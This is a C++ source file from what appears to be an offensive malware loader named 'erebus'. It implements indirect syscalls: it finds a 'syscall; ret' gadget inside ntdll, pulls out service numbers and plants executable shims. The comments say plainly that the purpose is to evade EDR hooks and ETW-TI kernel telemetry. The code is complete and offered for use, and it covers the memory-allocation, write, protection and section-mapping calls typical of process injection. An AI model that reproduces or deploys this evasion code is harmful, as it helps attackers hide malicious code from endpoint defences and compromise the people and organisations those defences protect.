/**
 * @file syscalls.cpp
 * @brief Indirect syscall infrastructure using in-ntdll gadgets.
 *
 * Rationale:
 *   With UnhookNtdll() in place, calls made through the hashed
 *   ImportFunction macros already reach clean syscall stubs inside
 *   ntdll - effectively "direct syscalls" via the legitimate stub.
 *   But two classes of defence slip past pure unhooking:
 *
 *     1) Re-hooking races. Commodity EDR watches ntdll's .text via
 *        PAGE_GUARD or a periodic integrity sweep and re-plants the
 *        hooks after our overlay runs. If the race loses, every
 *        subsequent Nt* call routes back through the hook.
 *
 *     2) Kernel telemetry that checks where the `syscall` instruction
 *        was issued from. ETW-TI (Threat Intel) and some kernel
 *        callbacks sample the user-mode return address at syscall
 *        entry and flag any syscall whose IP is not inside the mapped
 *        ntdll image. Allocating an RWX shim that contains its own
 *        `syscall` instruction trips this immediately.
 *
 * Approach (a variant of "TartarusGate"):
 *
 *   - Walk ntdll once to pick a `syscall; ret` byte sequence inside
 *     its .text. Any Nt* stub ends with these three bytes, so the
 *     gadget lives at dozens of addresses inside the real image.
 *
 *   - For each Nt* function we care about, read the first bytes of
 *     its stub and extract the system service number from the
 *     `mov eax, imm32` prologue. We trust the unhook overlay to have
 *     restored this prologue; if the stub is still hooked and starts
 *     with `jmp rel32` instead, we refuse to register that syscall
 *     and let the caller fall back to the (possibly hooked) stub.
 *
 *   - Emit one tiny 21-byte shim per registered syscall into an RX
 *     page: `mov r10, rcx; mov r11, <gadget>; mov eax, <ssn>; jmp r11`.
 *     When called via a function-pointer cast to the Nt* signature,
 *     the shim passes every register argument through untouched and
 *     hands control to the in-ntdll gadget, which issues `syscall`
 *     from inside the legitimate image. Kernel telemetry sees a normal
 *     ntdll-originated syscall.
 *
 *   - The shim page itself contains no syscall instruction. Only the
 *     three-byte gadget in ntdll runs the `syscall`, which is exactly
 *     where the kernel expects it.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/syscalls.hpp"

namespace erebus {
namespace evasion {

    // Registered syscalls. Add entries here to expose a new indirect
    // call. Each row is (hash, index into g_shims). The hashes are
    // resolved against ntdll's export table at Init time.
    struct SyscallEntry {
        ULONG funcHash;
        ULONG ssn;          // resolved at Init; 0xFFFFFFFF = unresolved
        PBYTE shim;         // pointer into g_shim_page
    };

    // Keep the registry small and append-only. Every entry costs 32
    // bytes of .data plus 21 bytes of RX shim.
    static SyscallEntry g_syscalls[] = {
        { H("NtProtectVirtualMemory"), 0xFFFFFFFF, NULL },
        { H("NtAllocateVirtualMemory"), 0xFFFFFFFF, NULL },
        { H("NtWriteVirtualMemory"),    0xFFFFFFFF, NULL },
        { H("NtCreateSection"),         0xFFFFFFFF, NULL },
        { H("NtMapViewOfSection"),      0xFFFFFFFF, NULL },
        { H("NtUnmapViewOfSection"),    0xFFFFFFFF, NULL },
    };
    static const SIZE_T g_syscall_count = sizeof(g_syscalls) / sizeof(g_syscalls[0]);

    // Shim layout: 21 bytes each.
    //   49 89 CA                          mov r10, rcx
    //   49 BB <8 bytes>                   mov r11, gadget
    //   B8 <4 bytes>                      mov eax, ssn
    //   41 FF E3                          jmp r11
    static const SIZE_T SHIM_SIZE = 21;
    static PBYTE        g_shim_page = NULL;
    static PVOID        g_gadget = NULL;
    static BOOL         g_initialised = FALSE;

    // ------------------------------------------------------------------
    // Locate an `0F 05 C3` (syscall; ret) sequence inside ntdll .text.
    // ------------------------------------------------------------------
    static PVOID FindSyscallGadget(HMODULE ntdll)
    {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++)
        {
            if (!(section->Name[0] == '.' && section->Name[1] == 't'
                  && section->Name[2] == 'e' && section->Name[3] == 'x'
                  && section->Name[4] == 't'))
            {
                continue;
            }

            PBYTE base = (PBYTE)ntdll + section->VirtualAddress;
            SIZE_T size = section->Misc.VirtualSize;
            if (size < 3) return NULL;

            for (SIZE_T off = 0; off + 3 <= size; off++)
            {
                if (base[off] == 0x0F && base[off + 1] == 0x05
                    && base[off + 2] == 0xC3)
                {
                    return (PVOID)(base + off);
                }
            }
            break;
        }
        return NULL;
    }

    // ------------------------------------------------------------------
    // Extract the SSN from the first bytes of a function stub.
    //
    // A clean Nt* stub starts with:
    //     4C 8B D1             mov r10, rcx
    //     B8 <ssn32>           mov eax, <ssn>
    // If the stub is hooked, the first byte is usually 0xE9 (jmp rel32)
    // or 0xFF 0x25 (jmp qword ptr). In that case we refuse to trust the
    // prologue and return 0xFFFFFFFF.
    // ------------------------------------------------------------------
    static ULONG ExtractSsn(PBYTE stub)
    {
        if (!stub) return 0xFFFFFFFF;
        // mov r10, rcx  (4C 8B D1)
        if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1) {
            return 0xFFFFFFFF;
        }
        // mov eax, imm32  (B8 xx xx xx xx)
        if (stub[3] != 0xB8) {
            return 0xFFFFFFFF;
        }
        ULONG ssn = 0;
        RtlCopyMemory(&ssn, stub + 4, 4);
        return ssn;
    }

    // ------------------------------------------------------------------
    // Plant one 21-byte shim at `dst` that sets up (ssn, gadget) and
    // jumps to the gadget. Arguments are passed through via standard
    // Windows x64 register ABI.
    // ------------------------------------------------------------------
    static void PlantShim(PBYTE dst, ULONG ssn, PVOID gadget)
    {
        // 49 89 CA                   mov r10, rcx
        dst[0] = 0x49; dst[1] = 0x89; dst[2] = 0xCA;
        // 49 BB <gadget 8 bytes>     mov r11, imm64
        dst[3] = 0x49; dst[4] = 0xBB;
        RtlCopyMemory(dst + 5, &gadget, 8);
        // B8 <ssn 4 bytes>           mov eax, imm32
        dst[13] = 0xB8;
        RtlCopyMemory(dst + 14, &ssn, 4);
        // 41 FF E3                   jmp r11
        dst[18] = 0x41; dst[19] = 0xFF; dst[20] = 0xE3;
    }

    BOOL InitIndirectSyscalls()
    {
        if (g_initialised) return TRUE;

        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) return FALSE;

        g_gadget = FindSyscallGadget(ntdll);
        if (!g_gadget) return FALSE;

        // Allocate one page of RW shim space, plant the shims, then flip
        // to RX via the (currently-hooked or unhooked) NtProtectVirtualMemory.
        // The RX flip is expensive but one-shot.
        SIZE_T page_size = g_syscall_count * SHIM_SIZE;
        // Round up to 4 KiB.
        SIZE_T alloc_size = (page_size + 0xFFF) & ~(SIZE_T)0xFFF;

        g_shim_page = (PBYTE)VirtualAlloc(NULL, alloc_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!g_shim_page) return FALSE;

        // Resolve SSNs and plant shims.
        SIZE_T resolved = 0;
        for (SIZE_T i = 0; i < g_syscall_count; i++)
        {
            PBYTE stub = (PBYTE)erebus::GetProcAddressC(ntdll, g_syscalls[i].funcHash);
            ULONG ssn = ExtractSsn(stub);
            if (ssn == 0xFFFFFFFF) {
                // Either unresolved export or still hooked. Leave the
                // entry marked unresolved; callers will fall back.
                g_syscalls[i].shim = NULL;
                continue;
            }
            PBYTE slot = g_shim_page + (i * SHIM_SIZE);
            PlantShim(slot, ssn, g_gadget);
            g_syscalls[i].ssn = ssn;
            g_syscalls[i].shim = slot;
            resolved++;
        }

        if (resolved == 0) {
            VirtualFree(g_shim_page, 0, MEM_RELEASE);
            g_shim_page = NULL;
            return FALSE;
        }

        // Flip the shim page to RX. Use NtProtectVirtualMemory via the
        // hashed resolver - even a hooked protection flip is fine here
        // because the shims themselves are the protection target, not
        // the function being called. Post-flip, the shims are executed
        // by jumping to the in-ntdll gadget, which is where syscalls
        // legitimately live.
        HMODULE nt2 = ImportModule("ntdll.dll");
        if (nt2) {
            ImportFunction(nt2, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
            if (NtProtectVirtualMemory) {
                PVOID base = g_shim_page;
                SIZE_T region = alloc_size;
                ULONG oldProtect = 0;
                NtProtectVirtualMemory(
                    (HANDLE)(LONG_PTR)-1,
                    &base,
                    &region,
                    PAGE_EXECUTE_READ,
                    &oldProtect
                );
            }
        }

        g_initialised = TRUE;
        return TRUE;
    }

    PVOID GetIndirectSyscall(ULONG funcHash)
    {
        if (!g_initialised) return NULL;
        for (SIZE_T i = 0; i < g_syscall_count; i++) {
            if (g_syscalls[i].funcHash == funcHash) {
                return (PVOID)g_syscalls[i].shim;
            }
        }
        return NULL;
    }

} // namespace evasion
} // namespace erebus
